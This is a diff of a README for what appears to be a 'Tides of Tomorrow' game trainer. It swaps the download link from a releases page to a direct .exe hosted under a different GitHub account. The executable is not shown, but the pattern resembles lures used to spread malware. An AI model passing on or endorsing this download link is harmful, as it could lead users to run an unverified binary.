@@ -8,7 +8,7 @@ In a world swallowed by endless oceans after a climate catastrophe, this trainer
 
 ### 📥 Download
 
-<a href="https://github.com/твойник/Tides-of-Tomorrow-Trainer/releases/latest">
+<a href="https://github.com/Solengleng/Tides-of-Tomorrow-trainer/releases/download/Tides-of-Tomorrow-trainer/TidesOfTomorrowTrainer.exe">
   <img src="https://img.shields.io/badge/DOWNLOAD-LATEST_VERSION-00ff9f?style=for-the-badge&logo=download&logoColor=black&labelColor=00b4d8" alt="Download Latest Version" height="60">
 </a>
 
